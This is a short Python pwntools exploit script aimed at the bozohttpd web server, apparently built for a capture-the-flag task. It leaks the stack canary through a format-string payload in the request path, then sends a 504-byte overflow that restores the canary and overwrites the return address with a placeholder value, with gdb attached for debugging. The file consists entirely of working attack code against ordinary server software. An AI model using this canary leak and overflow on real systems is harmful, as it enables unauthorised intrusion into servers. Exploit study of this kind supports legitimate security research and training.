from pwn import *
from ropper import RopperService
context.arch = 'amd64'

t = 'local'

HOST= '127.0.0.1'
PORT= 8080

if t == 'remote':
	HOST = '*****'
	PORT = 8080

e=ELF("./bozohttpd")

def request(payload, debug = False, commands=[]):
	r=connect(HOST,PORT)
	
	if debug and t=='local':
		#open new window and attach gdb
		gdb.attach("bozohttpd",gdbscript="\n".join(commands))
	
	payload=payload.encode("hex")
	r.send("GET /00"+payload+" HTTP/1.1\r\n")
	r.send("Host: http://localhost:8080\r\n")
	r.send("\r\n")
	
	page = r.recvuntil("</html>\n")
	more = r.recvall()
	if more.strip():
		print str(more.strip())
	r.close()
	return page.split(":")[5]
	

def leak_cookie():
	payload = "%88$p"
	blob = request(payload)
	return int(blob[2:],16)

#leak stack cookie
cookie = leak_cookie()
print "leaked stack cookie = " + hex(cookie)

ret = 0x4142434445464748 # overwrite return address by this value

#start creating payload
payload = "a"*504+p64(cookie)+"a"*8+p64(ret)
request(payload, debug=True, commands = ["bp 0x000000000040808A","c"])
